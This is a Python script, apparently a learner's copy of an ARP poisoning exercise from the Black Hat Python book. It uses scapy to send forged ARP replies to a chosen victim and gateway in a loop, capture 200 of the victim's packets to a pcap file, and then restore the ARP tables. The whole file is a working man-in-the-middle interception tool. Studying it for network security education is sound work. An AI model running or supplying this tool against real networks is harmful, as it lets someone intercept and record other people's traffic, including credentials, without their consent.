# -*-coding:Utf-8 -*

"""
This is an arp poisoning tool from BHP book.

Improvement done:

Improvement to do:
- add argparse to manage arguments
- add parmeter for output file
- move output file default path to user home
- need to improve end after CTRL-C
"""
from multiprocessing import Process
from scapy.all import ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap

import os
import sys
import time


def get_mac(targetip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetip)
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src


class Arper:
    def __init__(self, victim, gateway, interface='en0'):
        self.victim = victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0
        print(f'Initialized {self.interface}:')
        print(f'\tGateway ({self.gateway} is at {self.gatewaymac}.')
        print(f'\tVictim ({self.victim}.')
        print('-'*30)

    def run(self):
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()
        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    def poison(self):
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac
        print(f'ip src:\t{poison_victim.psrc}')
        print(f'mac src:\t{poison_victim.hwsrc}')
        print(f'ip dst: {poison_victim.pdst}')
        print(f'mac dst:\t{poison_victim.hwdst}')
        print(poison_victim.summary())
        print('-'*30)
        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac
        print(f'ip src:\t{poison_gateway.psrc}')
        print(f'mac src:\t{poison_gateway.hwsrc}')
        print(f'ip dst: {poison_gateway.pdst}')
        print(f'mac dst:\t{poison_gateway.hwdst}')
        print(poison_gateway.summary())
        print('-' * 30)
        print(f'Beginning the ARP poison. [CTRL-C to stop]')
        while True:
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt:
                self.restore()
                exit(0)
            else:
                time.sleep(2)

    def sniff(self, count=200):
        time.sleep(5)
        print(f'Sniffing {count} packets.')
        bpf_filter = f"ip host {self.victim}"
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
        wrpcap('arper.pcap', packets)
        print('Got the packets!')
        self.restore()
        self.poison_thread.terminate()
        print('Finished!')

    def restore(self):
        print('Restoring ARP tables...')
        send(ARP(
            op=2,
            psrc=self.gateway,
            hwsrc=self.gatewaymac,
            pdst=self.victim,
            hwdst='ff:ff:ff:ff:ff:ff'),
            count=5
        )
        send(ARP(
            op=2,
            psrc=self.victim,
            hwsrc=self.victimmac,
            pdst=self.gateway,
            hwdst='ff:ff:ff:ff:ff:ff'),
            count=5
        )


def main():
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    myarp = Arper(victim, gateway, interface)
    myarp.run()


if __name__ == '__main__':
    main()